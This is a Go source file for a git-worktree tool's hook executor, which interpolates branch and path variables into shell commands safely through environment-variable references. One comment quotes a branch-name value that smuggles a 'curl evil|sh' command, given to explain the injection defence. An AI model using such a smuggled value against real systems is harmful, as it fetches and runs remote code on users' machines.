package hooks

import (
	"fmt"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ExecutionContext provides context for hook action execution
type ExecutionContext struct {
	// Event being processed
	Event string

	// Worktree information
	Worktree     string // Short worktree name (e.g., "testing")
	WorktreeFull string // Full worktree directory name (e.g., "grove-cli-testing")
	Branch       string // Branch name (e.g., "testing" or "feature/testing")

	// Project information
	Project string // Project name (e.g., "grove-cli")

	// Paths
	MainPath string // Absolute path to main worktree
	NewPath  string // Absolute path to new/target worktree
	PrevPath string // Absolute path to previous worktree (for switch events)

	// Optional extras
	Port int // Allocated port (if any)

	// Output is where handlers should print status messages. nil means stdout.
	Output io.Writer
}

// Out returns the context's output writer, falling back to stdout. Exported
// so plugin handlers can use the same fallback rule as built-ins.
func (c *ExecutionContext) Out() io.Writer {
	if c == nil || c.Output == nil {
		return os.Stdout
	}
	return c.Output
}

// Executor runs user-configured hooks for lifecycle events
type Executor struct {
	config *HooksConfig
	Output io.Writer // destination for status messages; defaults to os.Stdout
}

// NewExecutor creates a new hook executor with loaded configuration.
// If groveDir is provided, it is forwarded to LoadHooksConfig for project hook discovery.
func NewExecutor(groveDir ...string) (*Executor, error) {
	cfg, err := LoadHooksConfig(groveDir...)
	if err != nil {
		return nil, fmt.Errorf("failed to load hooks config: %w", err)
	}

	return &Executor{config: cfg, Output: os.Stdout}, nil
}

// NewExecutorWithConfig creates an executor with a provided config (useful for testing)
func NewExecutorWithConfig(cfg *HooksConfig) *Executor {
	return &Executor{config: cfg, Output: os.Stdout}
}

// printf writes to the executor's output writer.
func (e *Executor) printf(format string, args ...any) {
	w := e.Output
	if w == nil {
		w = os.Stdout
	}
	_, _ = fmt.Fprintf(w, format, args...)
}

// Execute runs all configured hooks for an event
// Returns an error if a required hook fails, otherwise just logs warnings
func (e *Executor) Execute(event string, ctx *ExecutionContext) error {
	if e.config == nil {
		return nil
	}

	actions := e.config.GetActionsForEvent(event)
	if len(actions) == 0 {
		return nil
	}

	// Apply per-branch/worktree overrides
	if len(e.config.Overrides) > 0 {
		override := e.config.FindOverride(ctx.Branch, ctx.Worktree)
		actions = ApplyOverride(actions, override, ctx.MainPath)
		if len(actions) == 0 {
			return nil
		}
	}

	if ctx.Output == nil {
		ctx.Output = e.Output
	}
	vars := e.buildVariables(ctx)

	for _, action := range actions {
		err := e.executeAction(&action, ctx, vars)
		if err == nil {
			continue
		}

		switch {
		case action.Required || action.OnFailure == "fail":
			// Abort: a required action failing stops the remaining actions and
			// fails the operation (documented "abort the entire operation").
			// required defaults to false, so this only affects hooks a user
			// explicitly opted into aborting on.
			e.printf("✗ Hook failed (required): %v\n", err)
			return fmt.Errorf("required %s hook failed: %w", event, err)
		case action.OnFailure == "ignore":
			// Silent - do nothing
		default:
			// Default: warn and keep going.
			e.printf("⚠ Hook warning: %v\n", err)
		}
	}

	return nil
}

// HasHooksForEvent returns true if there are any hooks configured for the event
func (e *Executor) HasHooksForEvent(event string) bool {
	if e.config == nil {
		return false
	}
	return e.config.HasActionsForEvent(event)
}

// executeAction runs a single hook action by looking up its handler in the
// global registry. Built-in handlers (copy/symlink/command/template) are
// registered at package init; plugins register their own types during Init().
func (e *Executor) executeAction(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
	if h, ok := LookupActionHandler(action.Type); ok {
		return h(action, ctx, vars)
	}
	// Distinguish "type belongs to a known plugin that's disabled" from "typo".
	if hint, ok := disabledTypeHint(action.Type); ok {
		return fmt.Errorf("unknown hook action type %q (%s)", action.Type, hint)
	}
	return fmt.Errorf("unknown hook action type: %s", action.Type)
}

// disabledTypeHint returns a hint when a known-but-not-registered type is
// referenced. Plugins claim names via RegisterActionHandler at startup; if
// nothing's registered, the plugin is likely disabled or unavailable.
func disabledTypeHint(typeName string) (string, bool) {
	switch typeName {
	case "docker:compose", "docker:exec":
		return "docker plugin disabled or unavailable", true
	}
	return "", false
}

// currentUsername caches the result of user.Current() across hook invocations.
// The username doesn't change during a process lifetime, so the syscall is
// pure waste on subsequent calls.
var (
	currentUsernameOnce sync.Once
	currentUsername     string
)

func cachedUsername() string {
	currentUsernameOnce.Do(func() {
		if u, err := user.Current(); err == nil {
			currentUsername = u.Username
		}
	})
	return currentUsername
}

// buildVariables creates the variable context for interpolation
func (e *Executor) buildVariables(ctx *ExecutionContext) *Variables {
	now := time.Now()

	return &Variables{
		Worktree:     ctx.Worktree,
		WorktreeFull: ctx.WorktreeFull,
		Branch:       ctx.Branch,
		Project:      ctx.Project,
		MainPath:     ctx.MainPath,
		NewPath:      ctx.NewPath,
		PrevPath:     ctx.PrevPath,
		Port:         ctx.Port,
		User:         cachedUsername(),
		Timestamp:    now.Unix(),
		Date:         now.Format("2006-01-02"),
	}
}

// Variables holds all available template variables
type Variables struct {
	Worktree     string // Short worktree name
	WorktreeFull string // Full worktree directory name
	Branch       string // Branch name
	Project      string // Project name
	MainPath     string // Main worktree path
	NewPath      string // New worktree path
	PrevPath     string // Previous worktree path
	Port         int    // Allocated port
	User         string // Current username
	Timestamp    int64  // Unix timestamp
	Date         string // ISO date (YYYY-MM-DD)
}

// Interpolate replaces template variables in a string using {{.variable}} syntax.
// Uses strings.NewReplacer for a single-pass replacement instead of N
// sequential strings.ReplaceAll calls — meaningful when many hook fields are
// interpolated.
func (v *Variables) Interpolate(s string) string {
	r := strings.NewReplacer(
		"{{.worktree}}", v.Worktree,
		"{{.worktree_full}}", v.WorktreeFull,
		"{{.branch}}", v.Branch,
		"{{.project}}", v.Project,
		"{{.main_path}}", v.MainPath,
		"{{.new_path}}", v.NewPath,
		"{{.prev_path}}", v.PrevPath,
		"{{.port}}", fmt.Sprintf("%d", v.Port),
		"{{.user}}", v.User,
		"{{.timestamp}}", fmt.Sprintf("%d", v.Timestamp),
		"{{.date}}", v.Date,
	)
	return r.Replace(s)
}

// shellVarBinding ties a template token to the environment variable that
// carries its value into a command hook's shell.
type shellVarBinding struct {
	token string // e.g. "{{.branch}}"
	env   string // e.g. "GROVE_HOOK_branch"
	value string
}

// shellVarBindings returns the ordered token→env→value tuples shared by
// InterpolateShell and ShellEnv so the rewritten command and the environment
// it runs in never drift apart.
func (v *Variables) shellVarBindings() []shellVarBinding {
	return []shellVarBinding{
		{"{{.worktree}}", "GROVE_HOOK_worktree", v.Worktree},
		{"{{.worktree_full}}", "GROVE_HOOK_worktree_full", v.WorktreeFull},
		{"{{.branch}}", "GROVE_HOOK_branch", v.Branch},
		{"{{.project}}", "GROVE_HOOK_project", v.Project},
		{"{{.main_path}}", "GROVE_HOOK_main_path", v.MainPath},
		{"{{.new_path}}", "GROVE_HOOK_new_path", v.NewPath},
		{"{{.prev_path}}", "GROVE_HOOK_prev_path", v.PrevPath},
		{"{{.port}}", "GROVE_HOOK_port", fmt.Sprintf("%d", v.Port)},
		{"{{.user}}", "GROVE_HOOK_user", v.User},
		{"{{.timestamp}}", "GROVE_HOOK_timestamp", fmt.Sprintf("%d", v.Timestamp)},
		{"{{.date}}", "GROVE_HOOK_date", v.Date},
	}
}

// InterpolateShell rewrites a command-hook string for safe execution via
// `sh -c`. Each {{.x}} token is replaced with an environment-variable
// reference to GROVE_HOOK_x rather than the literal value, and the real
// values are supplied out-of-band via ShellEnv. Because parameter expansion
// happens *after* the shell has parsed the command, metacharacters in a value
// can never inject a command — critical because grove interpolates values it
// doesn't control (notably {{.branch}}, and grove checks out branches from
// untrusted PRs via `grove fetch pr/<N>`, so a branch named `x";curl evil|sh;"`
// must not run).
//
// The reference is emitted to match the quoting context the token sits in,
// tracked with a small quote-state scanner:
//
//	bare:           echo {{.branch}}      → echo "${GROVE_HOOK_branch}"
//	double-quoted:  echo "on {{.branch}}" → echo "on ${GROVE_HOOK_branch}"
//	single-quoted:  echo 'on {{.branch}}' → echo 'on '"${GROVE_HOOK_branch}"''
//
// Bare tokens are wrapped in double quotes so a value containing spaces or
// glob characters stays a single, unexpanded word (paths legally contain
// both). Single-quoted tokens use the POSIX close-splice-reopen idiom,
// because ${...} never expands inside single quotes — a flat rewrite there
// leaked the literal reference and silently broke shipped recipes like
// `pkill -f '{{.worktree}}'`.
//
// Flat quoting is not enough: command substitution `$( )` and backticks
// restart quoting (the outer quotes do not reach inside), POSIX arithmetic
// `$(( ))` takes no quoting at all (a quoted operand is a syntax error on
// dash, which is `/bin/sh` on Debian), and heredoc bodies do no word-splitting
// (an added "..." wrapper would land literally in the output). A small stack of
// shell contexts models these so the reference is emitted correctly in each:
//
//	bare:           echo {{.branch}}          → echo "${GROVE_HOOK_branch}"
//	double-quoted:  echo "on {{.branch}}"     → echo "on ${GROVE_HOOK_branch}"
//	single-quoted:  echo 'on {{.branch}}'     → echo 'on '"${GROVE_HOOK_branch}"''
//	command-sub:    "$(f '{{.worktree}}')"    → "$(f ''"${GROVE_HOOK_worktree}"'')"
//	arithmetic:     $(({{.port}} + 1))        → $((${GROVE_HOOK_port} + 1))
//	heredoc body:   BRANCH={{.branch}}         → BRANCH=${GROVE_HOOK_branch}
//
// A quoted heredoc delimiter (`<<'EOF'`) suppresses shell expansion entirely,
// so the body is emitted verbatim by the shell; there the literal value is
// substituted directly — correct (a ${...} reference would never expand) and
// still injection-safe (nothing in the body is re-parsed).
//
// Two more constructs the flat model got wrong: bare parens are counted per
// frame so a subshell or case-pattern `)` inside `$( )` doesn't close the
// substitution frame early, and `$'…'` (ANSI-C quoting, honored by the bash
// sinks such as docker's `bash -cil`) is tracked so a token splice reopens
// with `$'` and the remainder keeps its escape semantics.
//
// Interpolate (literal substitution) remains correct for filesystem paths and
// template bodies, which Go handles directly and which never reach a shell.
func (v *Variables) InterpolateShell(s string) string {
	bindings := v.shellVarBindings()
	envByToken := make(map[string]string, len(bindings))
	valByToken := make(map[string]string, len(bindings))
	for _, b := range bindings {
		envByToken[b.token] = b.env
		valByToken[b.token] = b.value
	}

	var out strings.Builder
	out.Grow(len(s) + 32)

	// A stack of nested shell contexts. `$( )` and backticks push a fresh frame
	// (quoting restarts inside them); `$(( ))` pushes an arithmetic frame that
	// carries no quoting. The innermost frame decides how a token is emitted.
	// parenDepth counts bare `(` (subshell, group, case pattern, arithmetic
	// grouping) opened in the frame, so their `)` isn't mistaken for the
	// frame's own closer.
	type frame struct {
		arith              bool
		backtick           bool
		inSingle, inDouble bool
		ansi               bool // inside $'...' (ANSI-C quoting)
		parenDepth         int
	}
	stack := []frame{{}}
	top := func() *frame { return &stack[len(stack)-1] }

	writeRef := func(env string) {
		t := top()
		switch {
		case t.arith:
			// Operand position: bare; arithmetic does no word-splitting.
			out.WriteString("${" + env + "}")
		case t.inSingle:
			// ${...} never expands inside '...': close, expand double-quoted,
			// reopen. Valid inside $( ) and backticks too.
			out.WriteString(`'"${` + env + `}"'`)
		case t.ansi:
			// Same splice, but reopen with $' so the remainder of the string
			// keeps its ANSI-C escape semantics (a plain ' would demote \n
			// and friends to literal text).
			out.WriteString(`'"${` + env + `}"$'`)
		case t.inDouble:
			out.WriteString("${" + env + "}")
		default:
			out.WriteString(`"${` + env + `}"`)
		}
	}

	// matchToken reports whether rest begins with a known {{.x}} token,
	// returning its env name and byte length.
	matchToken := func(rest string) (env string, size int, ok bool) {
		if !strings.HasPrefix(rest, "{{.") {
			return "", 0, false
		}
		rel := strings.Index(rest, "}}")
		if rel < 0 {
			return "", 0, false
		}
		env, ok = envByToken[rest[:rel+2]]
		return env, rel + 2, ok
	}

	var heredocs []heredocSpec // FIFO of heredocs opened on the current line
	i := 0
	for i < len(s) {
		// Token rewrite, sensitive to the current context.
		if env, size, ok := matchToken(s[i:]); ok {
			writeRef(env)
			i += size
			continue
		}

		t := top()

		// A backslash escapes the next character everywhere except inside
		// single quotes (where it is literal). Arithmetic has no quoting to
		// protect, but a stray backslash there is unusual and copied through.
		// When the escaped character opens a {{.x}} token, the token must
		// still substitute (plain Interpolate does): the backslash spent
		// itself on template syntax, so it survives only where the shell
		// would keep it literally — double quotes (before a non-special
		// character) and $'...', emitted as an escaped backslash so it can't
		// disturb the spliced reference.
		if s[i] == '\\' && !t.inSingle && i+1 < len(s) {
			if env, size, ok := matchToken(s[i+1:]); ok {
				if t.inDouble || t.ansi {
					out.WriteString(`\\`)
				}
				writeRef(env)
				i += 1 + size
				continue
			}
			out.WriteByte(s[i])
			out.WriteByte(s[i+1])
			i += 2
			continue
		}

		// Operators are only meaningful outside single quotes and $'...'.
		if !t.inSingle && !t.ansi {
			switch {
			case strings.HasPrefix(s[i:], "$(("):
				out.WriteString("$((")
				stack = append(stack, frame{arith: true})
				i += 3
				continue
			case strings.HasPrefix(s[i:], "$("):
				out.WriteString("$(")
				stack = append(stack, frame{})
				i += 2
				continue
			case strings.HasPrefix(s[i:], "$'") && !t.inDouble && !t.arith:
				t.ansi = true
				out.WriteString("$'")
				i += 2
				continue
			case s[i] == '(' && !t.inDouble:
				t.parenDepth++
				out.WriteByte('(')
				i++
				continue
			case s[i] == ')' && t.parenDepth > 0 && !t.inDouble:
				// Closes a bare paren from this frame, not the frame itself.
				t.parenDepth--
				out.WriteByte(')')
				i++
				continue
			case s[i] == ')' && t.arith && strings.HasPrefix(s[i:], "))"):
				out.WriteString("))")
				if len(stack) > 1 {
					stack = stack[:len(stack)-1]
				}
				i += 2
				continue
			case s[i] == ')' && !t.arith && !t.backtick && !t.inDouble && len(stack) > 1:
				out.WriteByte(')')
				stack = stack[:len(stack)-1]
				i++
				continue
			case s[i] == '`':
				out.WriteByte('`')
				if t.backtick {
					if len(stack) > 1 {
						stack = stack[:len(stack)-1]
					}
				} else {
					stack = append(stack, frame{backtick: true})
				}
				i++
				continue
			case !t.arith && !t.inDouble && strings.HasPrefix(s[i:], "<<"):
				// Inside double quotes `<<` is literal text; treating it as a
				// heredoc there swallowed the rest of the command as "body".
				if spec, consumed, ok := parseHeredocIntroducer(s[i:]); ok {
					out.WriteString(s[i : i+consumed])
					heredocs = append(heredocs, spec)
					i += consumed
					continue
				}
			}
		}

		switch c := s[i]; {
		case c == '\'' && t.ansi:
			// Unescaped ' terminates $'...' (escaped \' was consumed above).
			t.ansi = false
			out.WriteByte(c)
			i++
		case c == '\'' && !t.inDouble && !t.arith:
			t.inSingle = !t.inSingle
			out.WriteByte(c)
			i++
		case c == '"' && !t.inSingle && !t.ansi && !t.arith:
			t.inDouble = !t.inDouble
			out.WriteByte(c)
			i++
		case c == '\n' && len(heredocs) > 0:
			// The newline ends the introducer line; heredoc bodies follow in
			// order until each terminator line.
			out.WriteByte('\n')
			i++
			for _, hd := range heredocs {
				i = writeHeredocBody(&out, s, i, hd, envByToken, valByToken)
			}
			heredocs = nil
		default:
			out.WriteByte(c)
			i++
		}
	}
	return out.String()
}

// heredocSpec describes a heredoc opened by a `<<[-]DELIM` introducer.
type heredocSpec struct {
	delim     string // terminator word
	quoted    bool   // <<'X' / <<"X": the shell performs no expansion in the body
	stripTabs bool   // <<-X: leading tabs are stripped before the terminator match
}

// parseHeredocIntroducer parses a heredoc operator (`<<`, `<<-`, with an
// optionally quoted delimiter word) at the start of s. It returns the spec, the
// number of bytes consumed through the delimiter, and whether one was found.
// Only the operator and delimiter word are consumed; the rest of the line
// scans normally. A here-string (`<<<`) is rejected.
func parseHeredocIntroducer(s string) (heredocSpec, int, bool) {
	if len(s) >= 3 && s[2] == '<' {
		return heredocSpec{}, 0, false // here-string <<<, not a heredoc
	}
	j := 2 // past "<<"
	var spec heredocSpec
	if j < len(s) && s[j] == '-' {
		spec.stripTabs = true
		j++
	}
	for j < len(s) && (s[j] == ' ' || s[j] == '\t') {
		j++
	}
	if j >= len(s) {
		return heredocSpec{}, 0, false
	}
	if q := s[j]; q == '\'' || q == '"' {
		j++
		start := j
		for j < len(s) && s[j] != q {
			j++
		}
		if j >= len(s) || j == start {
			return heredocSpec{}, 0, false
		}
		spec.delim = s[start:j]
		spec.quoted = true
		return spec, j + 1, true
	}
	start := j
	for j < len(s) && isHeredocDelimByte(s[j]) {
		j++
	}
	if j == start {
		return heredocSpec{}, 0, false
	}
	spec.delim = s[start:j]
	return spec, j, true
}

func isHeredocDelimByte(b byte) bool {
	return b == '_' || b == '-' || b == '.' ||
		(b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || (b >= '0' && b <= '9')
}

// writeHeredocBody emits the heredoc body from s[i] up to and including the
// terminator line, rewriting tokens, and returns the index just past it. In an
// unquoted heredoc the shell expands parameters, so a bare ${...} reference is
// emitted (a heredoc does no word-splitting, and quotes would be literal); in a
// quoted heredoc the shell expands nothing, so the literal value is substituted
// — correct and injection-safe because the body is treated verbatim.
func writeHeredocBody(out *strings.Builder, s string, i int, hd heredocSpec, envByToken, valByToken map[string]string) int {
	for i < len(s) {
		nl := strings.IndexByte(s[i:], '\n')
		var line string
		var next int
		if nl < 0 {
			line, next = s[i:], len(s)
		} else {
			line, next = s[i:i+nl], i+nl+1
		}
		match := line
		if hd.stripTabs {
			match = strings.TrimLeft(match, "\t")
		}
		if strings.TrimRight(match, "\r") == hd.delim {
			out.WriteString(s[i:next]) // terminator line, verbatim
			return next
		}
		writeHeredocLine(out, line, hd.quoted, envByToken, valByToken)
		if nl >= 0 {
			out.WriteByte('\n')
		}
		i = next
	}
	return i
}

func writeHeredocLine(out *strings.Builder, line string, quoted bool, envByToken, valByToken map[string]string) {
	for j := 0; j < len(line); {
		if strings.HasPrefix(line[j:], "{{.") {
			if rel := strings.Index(line[j:], "}}"); rel >= 0 {
				token := line[j : j+rel+2]
				if quoted {
					if val, ok := valByToken[token]; ok {
						out.WriteString(val)
						j += rel + 2
						continue
					}
				} else if env, ok := envByToken[token]; ok {
					out.WriteString("${" + env + "}")
					j += rel + 2
					continue
				}
			}
		}
		out.WriteByte(line[j])
		j++
	}
}

// ShellEnv returns the GROVE_HOOK_*=value assignments that back the references
// InterpolateShell emits, for appending to a command hook's environment.
func (v *Variables) ShellEnv() []string {
	bindings := v.shellVarBindings()
	env := make([]string, 0, len(bindings))
	for _, b := range bindings {
		env = append(env, b.env+"="+b.value)
	}
	return env
}

// builtinCopy performs a copy action
func builtinCopy(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
	from := vars.Interpolate(action.From)
	to := vars.Interpolate(action.To)

	srcPath, err := resolvePathSafe(from, ctx.MainPath)
	if err != nil {
		return fmt.Errorf("copy source path: %w", err)
	}
	dstPath, err := resolvePathSafe(to, ctx.NewPath)
	if err != nil {
		return fmt.Errorf("copy destination path: %w", err)
	}

	srcInfo, err := os.Stat(srcPath)
	if err != nil {
		if os.IsNotExist(err) {
			return fmt.Errorf("copy source does not exist: %s", srcPath)
		}
		return fmt.Errorf("copy: cannot access source %s: %w", srcPath, err)
	}

	if srcInfo.IsDir() {
		if err := copyDir(srcPath, dstPath); err != nil {
			return fmt.Errorf("copy directory %s to %s: %w", from, to, err)
		}
	} else {
		if err := copyFile(srcPath, dstPath); err != nil {
			return fmt.Errorf("copy file %s to %s: %w", from, to, err)
		}
	}

	_, _ = fmt.Fprintf(ctx.Out(), "✓ Copied %s\n", to)
	return nil
}

// builtinSymlink performs a symlink action
func builtinSymlink(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
	from := vars.Interpolate(action.From)
	to := vars.Interpolate(action.To)

	srcPath, err := resolvePathSafe(from, ctx.MainPath)
	if err != nil {
		return fmt.Errorf("symlink source path: %w", err)
	}
	linkPath, err := resolvePathSafe(to, ctx.NewPath)
	if err != nil {
		return fmt.Errorf("symlink destination path: %w", err)
	}

	if _, err := os.Lstat(srcPath); err != nil {
		if os.IsNotExist(err) {
			return fmt.Errorf("symlink source does not exist: %s", srcPath)
		}
		return fmt.Errorf("symlink: cannot access source %s: %w", srcPath, err)
	}

	if _, err := os.Lstat(linkPath); err == nil {
		if err := os.Remove(linkPath); err != nil {
			return fmt.Errorf("symlink: cannot remove existing %s: %w", linkPath, err)
		}
	}

	if err := os.Symlink(srcPath, linkPath); err != nil {
		return fmt.Errorf("symlink %s -> %s: %w", to, from, err)
	}

	_, _ = fmt.Fprintf(ctx.Out(), "✓ Symlinked %s\n", to)
	return nil
}

// builtinCommand performs a command action
func builtinCommand(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
	// Shell-safe interpolation: the command is executed via `sh -c`, so
	// interpolated values (branch names in particular) must be quoted to
	// prevent command injection. See Variables.InterpolateShell.
	command := vars.InterpolateShell(action.Command)

	var workDir string
	switch action.WorkingDir {
	case "main":
		workDir = ctx.MainPath
	case "new":
		workDir = ctx.NewPath
	case "":
		workDir = defaultCommandWorkDir(ctx)
	default:
		workDir = vars.Interpolate(action.WorkingDir)
	}

	timeout := time.Duration(action.Timeout) * time.Second
	start := time.Now()

	w := ctx.Out()
	if err := runCommand(command, workDir, timeout, vars.ShellEnv(), w, w); err != nil {
		return fmt.Errorf("command '%s': %w", command, err)
	}

	elapsed := time.Since(start)
	_, _ = fmt.Fprintf(w, "✓ Ran: %s (%.1fs)\n", command, elapsed.Seconds())
	return nil
}

// defaultCommandWorkDir picks the working directory for a command action that
// didn't set working_dir. The new worktree is the natural default, but it is
// guaranteed ABSENT for exactly two events — pre-create fires before the
// directory exists and post-remove after it's deleted — so those default to
// the main worktree instead of failing chdir (ENOENT) on every invocation.
// An explicit working_dir = "new" is honored (and fails loudly) even there.
func defaultCommandWorkDir(ctx *ExecutionContext) string {
	if (ctx.Event == EventPreCreate || ctx.Event == EventPostRemove) && ctx.MainPath != "" {
		return ctx.MainPath
	}
	return ctx.NewPath
}

// builtinTemplate performs a template action
func builtinTemplate(action *HookAction, ctx *ExecutionContext, vars *Variables) error {
	from := vars.Interpolate(action.From)
	to := vars.Interpolate(action.To)

	srcPath, err := resolvePathSafe(from, ctx.MainPath)
	if err != nil {
		return fmt.Errorf("template source path: %w", err)
	}
	dstPath, err := resolvePathSafe(to, ctx.NewPath)
	if err != nil {
		return fmt.Errorf("template destination path: %w", err)
	}

	content, err := os.ReadFile(srcPath)
	if err != nil {
		if os.IsNotExist(err) {
			return fmt.Errorf("template source does not exist: %s", srcPath)
		}
		return fmt.Errorf("template: cannot read %s: %w", srcPath, err)
	}

	extVars := *vars
	result := string(content)

	for k, v := range action.Vars {
		pattern := "{{." + k + "}}"
		result = strings.ReplaceAll(result, pattern, vars.Interpolate(v))
	}

	result = extVars.Interpolate(result)

	if dir := filepath.Dir(dstPath); dir != "" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("template: cannot create directory: %w", err)
		}
	}

	if err := os.WriteFile(dstPath, []byte(result), 0644); err != nil {
		return fmt.Errorf("template: cannot write %s: %w", dstPath, err)
	}

	_, _ = fmt.Fprintf(ctx.Out(), "✓ Generated %s from template\n", to)
	return nil
}

func init() {
	RegisterActionHandler("copy", builtinCopy)
	RegisterActionHandler("symlink", builtinSymlink)
	RegisterActionHandler("command", builtinCommand)
	RegisterActionHandler("template", builtinTemplate)
}
